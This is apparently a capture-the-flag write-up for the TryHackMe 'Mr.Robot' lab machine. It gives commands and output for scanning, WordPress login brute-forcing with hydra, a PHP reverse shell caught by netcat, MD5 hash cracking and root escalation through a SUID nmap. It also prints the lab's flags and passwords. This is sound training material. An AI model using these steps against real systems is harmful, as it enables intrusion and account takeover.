# Mr.Robot

Tags: README, THM

# First key

---

### NMAP

---

```jsx
# Nmap 7.92 scan initiated Mon Sep  6 18:31:55 2021 as: nmap -vv -sC -sV -oN nmap/initial 10.10.32.192
Nmap scan report for 10.10.32.192
Host is up, received syn-ack (0.16s latency).
Scanned at 2021-09-06 18:31:55 PDT for 116s
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  REASON       VERSION
22/tcp  closed ssh      conn-refused
80/tcp  open   http     syn-ack      Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open   ssl/http syn-ack      Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  6 18:33:51 2021 -- 1 IP address (1 host up) scanned in 116.45 seconds
```

### Robot.txt

---

```jsx
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Curl key-1-of-3.txt and .dic for later

---

```jsx
➜  Mr.Robot wget http://$IP/key-1-of-3.txt http://$IP/fsocity.dic

--2021-09-06 23:15:07--  http://10.10.173.7/key-1-of-3.txt
Connecting to 10.10.173.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33 [text/plain]
Saving to: ‘key-1-of-3.txt.1’

key-1-of-3.txt.1                                   100%[================================================================================================================>]      33  --.-KB/s    in 0s

2021-09-06 23:15:07 (2,42 MB/s) - ‘key-1-of-3.txt.1’ saved [33/33]

--2021-09-06 23:15:07--  http://10.10.173.7/fsocity.dic
Reusing existing connection to 10.10.173.7:80.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6,9M) [text/x-c]
Saving to: ‘fsocity.dic.1’

fsocity.dic.1                                      100%[================================================================================================================>]   6,91M  1,48MB/s    in 8,2s

2021-09-06 23:15:16 (862 KB/s) - ‘fsocity.dic.1’ saved [7245381/7245381]

FINISHED --2021-09-06 23:15:16--
Total wall clock time: 9,7s
Downloaded: 2 files, 6,9M in 8,2s (862 KB/s)
```

```jsx
➜  Mr.Robot cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
➜  Mr.Robot
```

# Second key

---

### Gobuster

---

```jsx
➜  Mr.Robot gobuster dir -u $IP -w /opt/wordlist/gobuster/directory-list-2.3-small.txt -t 100 -q
/rss                  (Status: 301) [Size: 0] [--> http://10.10.32.192/feed/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.32.192/blog/]
/images               (Status: 301) [Size: 235] [--> http://10.10.32.192/images/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.32.192/wp-login.php]
/video                (Status: 301) [Size: 234] [--> http://10.10.32.192/video/]
/0                    (Status: 301) [Size: 0] [--> http://10.10.32.192/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.32.192/feed/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.32.192/wp-content/]
/image                (Status: 301) [Size: 0] [--> http://10.10.32.192/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.32.192/feed/atom/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.32.192/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.32.192/audio/]
/intro                (Status: 200) [Size: 516314]
/css                  (Status: 301) [Size: 232] [--> http://10.10.32.192/css/]
/wp-login             (Status: 200) [Size: 2606]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.32.192/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.32.192/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.32.192/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.32.192/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.32.192/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.32.192/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.32.192/wp-admin/]
```

### Burp

---

![burp.png](https://i.ibb.co/jDFFsyM/burp.png)

### Hashcat using the fsocity.dic

---

```jsx
hydra -L fsocity.dic -p yes $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.86.194%2Fwp-admin%2F&testcookie=1:F=Invalid username"

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-06 21:31:54
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.86.194:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.86.194%2Fwp-admin%2F&testcookie=1:F=Invalid username
[80][http-post-form] host: 10.10.86.194   login: Elliot   password: yes
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

### Burp knowing the username

---

![burp2.png](https://i.ibb.co/4t9MX4h/burp2.png)

### Hydra knowing the username

---

pass: ER28-0652

### Uploaded reverse shell

---

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

### Listened with netcat

---

```jsx
➜  Mr.Robot nc -lv 9001

Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:34:25 up 17 min,  0 users,  load average: 0.00, 0.09, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ ls
```

### Fix tty

---

```jsx
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$
```

### Found file to open

---

```jsx
$ whoami
daemon
$ ls -a
.
..
key-2-of-3.txt
password.raw-md5
$ ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$
```

Password is hash, using: [https://md5.gromweb.com/](https://md5.gromweb.com/) was able de hash

pass: abcdefghijklmnopqrstuvwxyz

### Connect as robot

---

```jsx
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$
```

### Read the password file

---

```jsx
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$
```

## Third key

---

### Check what the current user can execute

---

```jsx
robot@linux:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

### NMAP can be used as an interactive shell

---

```jsx
robot@linux:/$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> id
id
Unknown command (id) -- press h <enter> for help
nmap> !sh
!sh
# cd root
cd root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
